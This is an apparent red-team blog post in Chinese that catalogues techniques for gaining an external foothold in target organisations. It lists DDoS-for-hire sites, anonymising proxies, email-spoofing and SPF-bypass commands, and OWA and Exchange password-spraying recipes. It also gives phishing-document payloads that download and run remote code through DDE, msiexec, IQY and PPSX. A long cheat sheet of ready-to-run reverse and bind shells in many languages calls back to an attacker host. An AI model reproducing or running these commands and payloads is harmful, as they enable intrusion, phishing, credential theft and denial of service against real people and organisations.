---
layout: post
title: 外围打点思路
subtitle: 持续更新
bigimg: /img/path.jpg
tags: [Red-Team]
---

**文章结构:**   

![Peripheral_Penetration_Tools.png](https://raw.githubusercontent.com/Scotoma8/CyberSecurity/master/Peripheral_Penetration/Peripheral_Penetration_Tools.png)

**文章内容:**   

# 外围打点(工具)

## Virtual Host信息

### https://github.com/jobertabma/virtual-host-discovery

### https://github.com/gwen001/vhost-brute

## DDoS平台

### https://www.ipstresser.com/

### https://stress.gg/

### https://booter.pw/

### https://iraven.cc/tools/stresser

### https://www.stressthem.to/

### https://www.justlayer.cc/

## 注册信息查询(手机/邮箱)

### https://www.reg007.com/

## 临时接收短信

### https://www.materialtools.com/

### http://www.z-sms.com/

### https://www.receive-sms-online.info/

### http://receive-sms-online.com/

### https://getfreesmsnumber.com/

### https://www.freeonlinephone.org/

### https://sms-online.co/receive-free-sms

## 抓包

### android

- 夜深模拟器

### SocksCap64+burp

### Wireshark分析https加密流量

- 仅支持Firefox or Chrome
1.导出对称密钥到文件
Windows:
为当前用户设置环境变量(/m为系统变量):
PS C:\Users\lirui\Desktop> SetX SSLKEYLOGFILE "$(get-location)\ssl.log"
成功: 指定的值已得到保存。
新开一个powershell
PS C:\Users\lirui\Desktop> Get-ChildItem ENV: | findstr SSLKEYLOGFILE
SSLKEYLOGFILE                  C:\Users\lirui\Desktop\ssl.log
chrome访问https://stackoverflow.com/
PS C:\Users\lirui\Desktop> dir
-a----         2020/2/7     16:36          18656 ssl.log

Linux:
vim /etc/bash.bashrc
export SSLKEYLOGFILE="/sslkey.log"
reboot
firefox
wireshark

2.wireshark设置:
edit->preferences->protocols->ssl->(pre)-Master-Secret log filename:C:\Users\lirui\Desktop\ssl.log->OK
开启抓包
Filter:ssl
Decrypted SSL record
Follow SSL Stream

## 流量代理

### 机场

- https://www.proxynova.com/proxy-server-list/

- http://spys.one/en/
- https://proxy.rudnkh.me/
- http://free-proxy.cz/zh/
- https://hide.me/en/proxy
- https://justmysocks.net/members/index.php

- http://www.zhimaruanjian.com/

### kali通过socks5隧道代理流量

- git clone https://github.com/showzeng/shadowsocksr
cd shadowsocksr/
vim config
chmod 755 runssr stopssr 
mv runssr stopssr /usr/local/bin/
source /etc/profile
cp shadowsocksr/ /opt/ -r
runssr 
netstat -ano
apt-get install tor
service tor start
service tor status
vim /etc/proxychains.conf 
netstat -ano
proxychains nc xxx.xxx.xxx.xxx 1234
- export http_proxy=socks5://127.0.0.1:1080 # 代理地址
export https_proxy=$http_proxy
- export http_proxy=http://proxy.xx.xx:3128
export https_proxy=http://proxy.xx.xx:3128
export https_proxy=https://username:password@www.xxx.fun:4128
- curl --socks5-hostname 127.0.0.1:1080 www.google.com
wget 只能使用 http 代理，而无法直接使用 socks 代理
1.proxychains wget www.google.com
2.apt-get install tsocks
cat /etc/tsocks.conf
server = 127.0.0.1
# Server type defaults to 4 so we need to specify it as 5 for this one
server_type = 5
# The port defaults to 1080 but I've stated it here for clarity 
server_port = 1080
tsocks wget www.google.com

### windows设置代理

- set http_proxy=socks5://127.0.0.1:1080
set https_proxy=https://username:password@www.xxx.fun:4128
set https_proxy=%http_proxy%

### SSH隧道流量转发

- Local Port Forwarding

	- ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
攻击者ssh连接受害者 攻击者端口 目标代理主机 目标代理端口

- Remote Port Forwarding

	- ssh <gateway> -R <remote port to bind>:<local host>:<local port>
受害者ssh连接攻击者机器 攻击者机器端口:受害者机器(127.0.0.1):受害者端口(3389)

- Dynamic Port Forwarding

	- ssh -D <local proxy port> -p <remote port> <target>
攻击者ssh连接受害者 攻击者端口 受害者sshd服务端口 受害者主机

## URL转换

### https://tinyurl.com/

## Fofa搜集

### 常规语法

- body="关键词1" && country="CN" && title="关键词2"  

## Shodan搜集

### EXP: https://exploits.shodan.io/welcome

### 常规语法

- Microsoft-IIS/6.0 city:"Seoul"
- hostname:".baidu.com" os:"windows"
- product:"apache"  net:"158.132.18.0/24"
- port:"8080" jboss country:"CN"
- product:"Mysql"  net:"140.117.13.0/24" port:"3306"
- os:"linux" port:"22" net:"107.160.1.0/24"
- port:"21" net:"107.160.1.0/24"
- city:"Beijing" product:"cisco"
- huawei country:"CN"
- hacked by country:"HK"
- country:"CN" "default password"
- country:"CN" router
- netcam country:"CN"

### 根据企业logo查询资产: http.favicon.hash:-1507567067 

### shodan chrome插件: https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap  

## Web fuzzing dicts

### https://github.com/Scotoma8/fuzzDicts

## Password Cracker

### Windows NTHash

- https://www.objectif-securite.ch/en/ophcrack

### Windows LMHash

- http://cracker.offensive-security.com/index.php
- https://sourceforge.net/projects/ophcrack/files/
- https://freerainbowtables.com/

- https://ophcrack.sourceforge.io/tables.php

## 钓鱼邮件

### https://emkei.cz/ - 在线邮件伪造

### 没有SPF 直接用swaks伪造 - kali自带

### https://github.com/Macr0phag3/email_hack - 邮件炸弹

### SMTP服务器中转:
telnet ip 25
HELO hello
mail from:<xx@xx.com>
rcpt to:<yy@yy.com>
data
from:xx@xx.com
to:yy@yy.com
subject:test
test
.
quit

### DKIM邮件签名:
邮件源文件DKIM头中s字段为selector的值
DKIM服务器域名 selector._domainkey.xxx.com
查找公开密钥 nslookup -type=txt s1024._domainkey.aliyun.com

### DMARC电子邮件认证协议:
通常情况下，它与SPF或DKIM结合使用，并告知收件方服务器当未通过SPF或 DKIM检测时该如何处理
nslookup -type=txt _dmarc.aliyun.com
none	不采取特定措施
quarantine	邮件接收者将DMARC验证失败的邮件标记为可疑的。
reject	域名所有者希望邮件接收者将DMARC验证失败的邮件拒绝
pct=：域名所有者邮件流中应用DMARC策略的消息百分比。
rua=：用于接收消息反馈的邮箱。 

### 绕过SPF

- swaks+smtp2go

	- 1.SMTP2GO配置
2.swaks --to xxx@163.com 
--from  admin@gov.com  
--ehlo  xxx  
--body  “hello ，i'm 007"
--server mail.smtp2go.com -p 2525 -au user -ap pass
3.保存eml格式文件
swaks --to test.163.com
--from admin@110.com 
--data 1.eml --h-from
--server mail.smtp2go.com -p 2525 -au user -ap pass

- SPF解析不当导致绕过

	- v=spf1 ip4:220.xxx.10.0/24 ~all
限定ip范围过大
软拒绝会接受来信,但可能被标记为垃圾邮件
当SPF记录设置成~all时,outlook邮箱可以接收邮件,QQ邮箱不接收,163邮箱被标记为垃圾邮件

验证域名的SPF记录是否配置正确:https://www.kitterman.com/spf/validate.html

- SPF配置不当导致绕过

	- 配置步骤:
1.在域名中增加SPF记录,向支持SPF功能的邮件服务器提供验证信息
2.配置邮件服务器支持SPF

问题:
1.域名增加了SPF记录,但邮件服务器不支持SPF检查或邮件网关未开启SPF检测,无法验证邮件来源
2.SPF解析在公网DNS,邮件服务器配置内部DNS,内部DNS无法进行SPF解析
3.攻击者在公司内网,内网SMTP服务器开启匿名邮件发送或者在信任中继服务器IP段

python SimpleEmailSpoofer.py -t [目标邮箱]  -n QQ邮箱管理员 -f admin@qq.com -j "邮件主题"  -e 1.txt  -s [内网邮件服务器IP]

- 高权限用户绕过

	- Exchange邮箱系统,拥有Domain admin权限的域用户,可通过outlook直接指定发件人,伪造任意发件人发送邮件,且邮件头无法显示真实IP

- 邮件客户端内容解析差异

	- Sender字段,代表的是邮件的实际发送者,邮件接收方会对它的邮件域名进行SPF检测,确认是否包含了发信人的IP地址
From字段,代表的是邮件发送人,即邮件里所显示的发件人,容易被伪造
在SPF配置有效的情况下,Sender必须通过SPF检验,所以我们可以设置为正常的邮件服务器地址,然后对From字段进行伪造
sudo ./swaks --to 67*****28@qq.com  --from admin@evil.com  --h-From: '=?GB2312?B?UVHTys/kudzA7dSx?= <admin@qq.com>' --ehlo evil.com --body hello --header "Subject: test"
--from   <实际发件人，对应Sender字段>
--h-From <邮件显示的发件人，对应From字段>
QQ邮箱网页版查看邮件,Sender和From字段不一样时,发件人的位置显示由admin@evil.com代发
使用Foxmail客户端查看同一封邮件,Sender和From字段不一样时,不显示代发,伪造成功
分别使用网页版邮箱和客户端邮箱打开同一封邮件,通过对比可以发现,不同的邮件客户端对发件人位置的内容解析是不一样的
qq邮箱、163邮箱网页版均会显示代发,Outlook邮箱不显示代发,具体邮件客户端软件可具体再行测试

- From字段名截断绕过

	- 当伪造邮件发送成功时,由于Sender和From字段不一样,部分邮件客户端接收邮件后,会提示邮件代发
在用SMTP发送电子邮件时,发件人别名,格式为:From:发件人别名<邮件地址>。通过对发件人别名字段填充大量的特殊字符,使邮箱客户端截取真实的邮件地址失败,从而只展示伪造的发件人别名和伪造邮箱
邮件伪造测试:
1.在QQ邮箱中导出mail.eml文件,删除前面不必要的字段信息
2.填充发件人别名,伪造邮件头From字段
From:=?gb2312?B?udzA7dSxIDxhZG1pbkBxcS5jb20+0aGhoaGhoaGhoaGhoaGhoaGhoaGhoQ==?=
=?gb2312?B?oaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGh?=
=?gb2312?B?oaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGh?=
=?gb2312?B?oaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGh?=
=?gb2312?B?oaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGh?=
=?gb2312?B?oaGhoaGhoaGhoaGhoaGhoaGhoaGhoSAgICAgICAgICAgICAgICAgIKGkoaQ=?=
=?gb2312?B?oaQgICAgICAgICAgICAgICAgIKGhICAgICAgIKGkoaShpA==?=  <admin@test.com>
3.使用--data参数发送邮件
sudo ./swaks --data mail.eml --to xx@qq.com --from admin@test.com

### 钓鱼文件

- 1.传统宏文件
2.CHM钓鱼
	index.html
	<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
	command exec 
	<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
	<PARAM name="Command" value="ShortCut">
	 <PARAM name="Button" value="Bitmap::shortcut">
	 <PARAM name="Item1" value=", calc.exe">
	 <PARAM name="Item2" value="273,1,1">
	</OBJECT>
	<SCRIPT>
	x.Click();
	</SCRIPT>
	</body></html>
	EasyCHM工具生成即可
3.https://github.com/0x09AL/CVE-2018-8174-msf
4.Windows 快捷键
	msfvenom -p windows/meterpreter/reverse_tcp lhost=xxxx lport=1234 -f msi > shell.txt
	c:\windows\system32\msiexec.exe /q /i http://xxxx/shell.txt
5.构造DDE钓鱼文档
	创建一个文档,打开后Ctrl + f9快捷键创建一个域,在花括号中添加
	DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe"
	DDEAUTO "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString('http://xx.xx.xx.xx/1.ps1'); # " "Microsoft Document Security Add-On"
6.word中插入外部对象(OLE)方式欺骗
	打开文档后点击对象，由文件创建，文件名:http://xxxx/artifact.exe 点击后上线
7.IQY特性钓鱼
	powershell –exec bypass –Command "& {Import-Module 'C:\xx\nishang-master\Client\Out-WebQuery.ps1';Out-WebQuery -URL http://192.168.1.5/iqy.html}"
	iqy.html
	=cmd|' /c bitsadmin /transfer c6c5 http://ip:port/a %APPDATA%\c6c5.exe&%APPDATA%\c6c5.exe&del %APPDATA%\c6c5.exe '!A0
	excel打开iqy文件 启用
8.PPT 动作按钮特性构造 PPSX钓鱼
	操作设置 鼠标悬停 运行程序 c:\windows\system32\mshta.exe http://xxxx/xx.hta
	保存成ppsx格式
	启用
9.RAR解压钓鱼
	WinRAR漏洞exp:
	https://github.com/WyAtu/CVE-2018-20250

## 企业信息

### 微信公众号

### 天眼查

### 企查查

### crunchbase

## 邮箱

### 任意地址发送邮件

- http://sendmail.romeng.men/

### 搜集账户

- Online Search Email

	- https://monitor.firefox.com/breaches

	- https://haveibeenpwned.com/

	- https://ghostproject.fr/

- https://hunter.io/
- https://github.com/m4ll0k/Infoga

- http://www.skymem.info/

- https://www.email-format.com/i/search/

- https://github.com/0Kee Team/CatchMail
- https://github.com/bit4woo/teemo

### 抓取账户

- theHarvester

	- git clone https://github.com/laramies/theHarvester
pip3 install --user -r requirements.txt

### 验证账户有效性

- https://mailtester.com/testmail.php

- https://github.com/Tzeross/verifyemail

- mailtester

	- git clone https://github.com/albandum/mailtester
pip install --user validate_email
配合https://www.aies.cn/pinyin.htm生成人名字典

- smtp-user-enum.pl 枚举用户名

	- https://github.com/pentestmonkey/smtp-user-enum

- 手动枚举

	- telnet xxx.xxx.xxx.xxx 25
VRFY root
MAIL FROM:root
RCPT TO:root

### 爆破账户弱口令

- medusa、hydra、SNETCracker、APT34组织 owa爆破工具
- medusa -h xxx.xxx.xxx.xxx -U user.txt -e ns -P pwd.txt -t 2 -T 2 -M smtp -R 3

### 邮件服务入口

- 1.查询域名MX记录找到真实ip,扫描该ip的C段，端口(25、109、110、143、465、995、993)
2.扫描子域名
3.搜索引擎、Shodan、fofa、zoomeye搜索
	site:target.com intitle:"Outlook Web App"
	site:target.com intitle:"mail"
	site:target.com intitle:"webmail"

### Outlook Web App

- 信息收集

	- msmailprobe

		- git clone https://github.com/busterb/msmailprobe.git
wget -c https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz
tar -C /usr/local -zxvf go1.8.3.linux-amd64.tar.gz
vim /etc/profile
export PATH=$PATH:/usr/local/go/bin
source /etc/profile
go build msmailprobe.go
./msmailprobe identity -t target.com

- 枚举邮箱用户

	- msmailprobe

		- ./msmailprobe userenum --onprem -t mail.target.com -U userList.txt -o validusers.txt --threads 25

- 爆破登录入口

	- msf > use auxiliary/scanner/http/owa_login

		- msf > set bruteforce_speed 0
msf > set rhost xxx.xxx.xxx.xxx
msf > set user_file /root/wordlist/user.txt
msf > set password admin@123
msf > set enum_domain true 
msf > set threads 1
msf > set stop_on_success false 
msf > set verbose true
msf > run

- 爆破EWS接口

	- msf > use auxiliary/scanner/http/owa_ews_login

		- msf > set rhosts xxx.xxx.xxx.xxx
msf > set user_file /root/wordlist/user.txt
msf > set password admin@123
msf > set stop_on_success false
msf > set threads 2
msf > set verbose true
msf > run

	- MailSniper脚本中Invoke PasswordSprayEWS模块

		- https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1
# powershell -exec bypass
PS > $PSVersionTable 注:此脚本只适用于高版本powershell
PS > Import Module .\MailSniper.ps1
PS > Invoke PasswordSprayEWS -ExchHostname xxx.xxx.xxx.xxx -UserList .\user.txt -Password Admin12345 -Threads 1 -Domain 0day -OutFile pwd_res.txt

- 爆破AutoDiscover接口

	- ruler

		- go get github.com/sensepost/ruler
go run ruler.go -h
./ruler-linux64 --url https://xxx.xxx.xxx.xxx/autodiscover/autodiscover.xml -k brute -u user.txt -p pwd.txt -d 0 --threads 2 -v

- 爆破Microsoft Server ActiveSync接口

	- EASSniper脚本中Invoke-PasswordSprayEAS模块

		- https://github.com/fugawi/EASSniper/blob/master/EASSniper.ps1
# powershell exec bypass
PS > $PSVersionTable 需要高版本powershell 
PS > Import Module .\EASSniper.ps1
PS > Get-Help Invoke-PasswordSprayEAS -examples
PS > Invoke-PasswordSprayEAS -ExchHostname xxx.xxx.xxx.xxx -UserList .\user.txt -Password admin@123 -Threads 2 -Domain 0day -OutFile pwd_res.txt

- 通过已控邮箱远程获取邮件系统中所有账户信息

	- MailSniper.ps1

		- https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1
# powershell exec bypass
PS D: D:\\> Import Module .\MailSniper.ps1
PS D: D:\\> Get-GlobalAddressList -ExchHostname ip -UserName sqladmin -Password admin@123 -ExchangeVersion Exchange2010_SP2 

- 查找不需要账号密码就可读取其邮件的账户

	- PS D: D:\\> Invoke-OpenInboxFinder -ExchangeVersion Exchange2010_SP2 -ExchHostname ip -EmailList user.txt -Remote

## Shell

### https://krober.biz/misc/reverse_shell.php

### bind shell

- nc.exe -lvp 4444 -e /bin/sh
- nc.exe -lvp 3333 -e cmd.exe

### reverse shell

- BASH REVERSE SHELL
bash -i >& /dev/tcp/192.168.6.128/1234 0>&1
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOC4yMjMuMTM1LjE1My8xMjM0IDA+JjE= | base64 -d | bash -i"

BASH REVERSE SHELL
0<&196;exec 196<>/dev/tcp/192.168.6.128/1234; sh <&196 >&196 2>&196

BASH REVERSE SHELL
exec 5<> /dev/tcp/192.168.6.128/1234; cat <&5 | while read line; do $line 2>&5>&5; done

PERL REVERSE SHELL
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.6.128:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

PERL REVERSE SHELL
perl -e 'use Socket;$i="192.168.6.128";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PERL REVERSE SHELL WINDOWS
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"192.168.6.128:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

RUBY REVERSE SHELL
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.6.128","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

RUBY REVERSE SHELL
ruby -rsocket -e'f=TCPSocket.open("192.168.6.128",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

RUBY REVERSE SHELL WINDOWS
ruby -rsocket -e 'c=TCPSocket.new("192.168.6.128","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

NETCAT REVERSE SHELL
nc -c /bin/sh 192.168.6.128 1234

NETCAT REVERSE SHELL
nc -e /bin/sh 192.168.6.128 1234

NETCAT REVERSE SHELL
/bin/sh | nc 192.168.6.128 1234

NETCAT REVERSE SHELL
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.6.128 1234 >/tmp/f

NETCAT REVERSE SHELL
rm -f /tmp/p; mknod /tmp/p p && nc 192.168.6.128 1234 0/tmp/p

NCAT REVERSE SHELL
ncat 192.168.6.128 1234 -e /bin/sh

PYTHON REVERSE SHELL
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.6.128",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PYTHON REVERSE SHELL
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.6.128",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

PYTHON REVERSE SHELL WINDOWS
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('192.168.6.128', 1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

PHP REVERSE SHELL
php -r '$sock=fsockopen("192.168.6.128",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

PHP REVERSE SHELL
php -r '$s=fsockopen("192.168.6.128",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

PHP REVERSE SHELL
php -r '$s=fsockopen("192.168.6.128",1234);`/bin/sh -i <&3 >&3 2>&3`;'

PHP REVERSE SHELL
php -r '$s=fsockopen("192.168.6.128",1234);system("/bin/sh -i <&3 >&3 2>&3");'

PHP REVERSE SHELL
php -r '$s=fsockopen("192.168.6.128",1234);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

TELNET REVERSE SHELL
rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.6.128 1234 0/tmp/p

TELNET REVERSE SHELL
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 192.168.6.128 1234 > /tmp/f

POWERSHELL REVERSE SHELL
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.6.128",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

POWERSHELL REVERSE SHELL
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.6.128',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

AWK REVERSE SHELL
awk 'BEGIN {s = "/inet/tcp/0/192.168.6.128/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

JAVA REVERSE SHELL
r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/192.168.6.128/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();

NODE.JS REVERSE SHELL
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(1234,"192.168.6.128",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();

TCLSH REVERSE SHELL
echo 'set s [socket 192.168.6.128 1234];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh

## 实时监测

### 域名流行度

- 查询二级域名

	- curl http://fdp.qianxin-inc.cn/topdomain/sld/qq.com
curl http://fdp.qianxin-inc.cn/topdomain/sld/rank/110

- 查询全域名

	- curl http://fdp.qianxin-inc.cn/topdomain/fqdn/www.baidu.com
curl http://fdp.qianxin-inc.cn/topdomain/fqdn/rank/1

### DNS流量

- 查询指定域名的客户端访问IP

	- curl "http://fdp.qianxin-inc.cn/pdns/access/domain/www.qianxin-inc.cn/?start=20170903155555&end=20170903170000"

- 查询指定客户端IP访问的域名信息

	- curl "http://fdp.qianxin-inc.cn/pdns/access/client/1.204.151.47/?start=20171201145555&end=20171203170000&limit=10"

### 域名及其子域名

- 查询指定域名的子域名及其出现时间

	- curl "http://fdp.qianxin-inc.cn/dtree/pogzu3g64vj-y4en6.com/?timeformat=simple"

### 域名与IP映射信息

- 查询指定域名或前缀通配符域名的解析信息

	- curl "http://fdp.qianxin-inc.cn/flint/rrset/*.baidu.com/?limit=10"

- 查询指定域名或IP或后缀通配域名或IP的被解析信息

	- curl "http://fdp.qianxin-inc.cn/flint/rdata/220.181.112.*/?limit=10"

- 指定CIDR查询相关域名(CIDR>=24)

	- curl http://beta.fdp.qianxin-inc.cn/flint/rdata/39.106.113.0/31/?slimit=1

### whois

- 查询whois记录总数

	- curl "http://fdp.qianxin-inc.cn/whois/count/baidu.com,google.com"
curl "http://fdp.qianxin-inc.cn/whois/count/email/dns-admin@google.com"
可选：domain、nameserver、email、phone、org、name

- 查询指定域名的whois详细信息

	- curl "http://fdp.qianxin-inc.cn/whois/detail/google.com"

- 查询指定域名的whois历史记录

	- curl "http://fdp.qianxin-inc.cn/whois/history/google.com/?order=1"

- 根据姓名/电话/email/机构名等信息反查相关域名

	- curl "http://fdp.qianxin-inc.cn/whois/reverse/shujun/?limit=10"
curl "http://fdp.qianxin-inc.cn/whois/reverse/name/shujun"
curl "http://fdp.qianxin-inc.cn/whois/reverse/phone/+86.13511629585"
curl "http://fdp.qianxin-inc.cn/whois/reverse/email/373192510@qq.com/?limit=10"
curl "http://fdp.qianxin-inc.cn/whois/reverse/org/shujun/?limit=5&skip=5"
curl "http://fdp.qianxin-inc.cn/whois/reverse/nameserver/dns.hichina.com"

### 域名请求趋势

- curl http://fdp.qianxin-inc.cn/trends/www.baidu.com?type=fqdn&start=20200301&end=20200305

### 根据ICP备案号查询相关ICP数据

- curl http://beta.fdp.qianxin-inc.cn/icp/%E6%B5%99B2-20080224-1
curl http://beta.fdp.qianxin-inc.cn/icp/domain/taobao.com
支持(domain,icp,webname,owner)

## 路由交换默认密码查询

### https://www.routerpasswords.com/
https://portforward.com/router password/
https://www.cleancss.com/router default/
https://cirt.net/passwords
https://bestvpn.org/default router passwords
https://toolmao.com/baiduapp/routerpwd/
https://datarecovery.com/rd/default passwords/

## 信息搜集工具

### maltego

### TheHarvester

### metagoofil 

### intrigue-core

## IP

### https://www.opengps.cn/Data/IP/LocHighAcc.aspx

### https://www.ip2location.com/

### https://www.maxmind.com/en/geoip-demo

### https://myip.ms/

### https://dnslytics.com/

### https://www.ipplus360.com/

### https://ip.rtbasia.com/

### http://www.chaipip.com/aiwen.html

### https://hackertarget.com/geoip-ip-location-lookup/

### http://www.cip.cc/

### https://ip.cn/

### 厂商ip段

- https://bgp.he.net/

### CDN

- 检测是否使用CDN

	- 1.多地Ping
http://ping.chinaz.com/ 
http://ce.cloud.360.cn/
http://ping.aizhan.com/
https://wepcc.com
https://asm.ca.com/en/ping.php
http://host-tracker.com/
http://www.webpagetest.org/
https://dnscheck.pingdom.com/

2.https://www.cdnplanet.com/tools/cdnfinder/#host:mobility.qianxin.com
https://www.cdnplanet.com/tools/cdnfinder/#site:https://www.baidu.com/

- 绕过CDN查真实IP

	- 1.查看历史DNS记录
	https://securitytrails.com/domain/qianxin.com/history/a
	https://securitytrails.com/dns-trails
	https://www.dnsqueries.com/en/domain_check.php
	https://dnsdumpster.com/
	https://www.shodan.io/search?query=xxx.com
	https://x.threatbook.cn/
	https://dnsdb.io/zh-cn
	https://sitereport.netcraft.com/?url=http://www.target.com/
	https://viewdns.info/dnsrecord/?domain=www.target.com
	https://viewdns.info/iphistory/?domain=www.target.com
	https://viewdns.info/api/docs/dns-record-lookup.php
	https://domain.8aq.net
	https://webiplookup.com
2.查询子域名
	可能与主站在同一服务器或同一个C段 以此查找主站的真实ip
	Google site:qianxin.com -www inurl:baidu.com
	https://securitytrails.com/list/apex_domain/qianxin.com
	http://tool.chinaz.com/subdomain/
	http://i.links.cn/subdomain/    
	http://subdomain.chaxun.la/
	http://searchdns.netcraft.com/
	https://www.virustotal.com/
	Layer子域名挖掘机
	wydomain：https://github.com/ring04h/wydomain    
	subDomainsBrute:https://github.com/lijiejie/
	Sublist3r:https://github.com/aboul3la/Sublist3r
3.利用漏洞使网站主动连接攻击者
4.服务器发邮件/给目标发邮件
	发邮件给non-exist@target.com，查看返回信息
	RSS订阅
	host www.target.com
	host domain-name-from-mail
	then get the ip
	curl -k -H "Host: www.target.com" https://ip
5.if the website allows user upload, try uploading something as in (a user profile pic) then trace connections. You'd get the real ip even if he hides it in DNS too.
6.国外DNS解析 http://www.ab173.com/dns/dns_world.php
7.超流量回溯
8.Zmap扫全网
	apnic 获取 IP 段
	使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机
	在 http-req 中的 Host 写 target.com
9.F5 LTM解码法
	F5 LTM做负载均衡
	对set-cookie关键字的解码
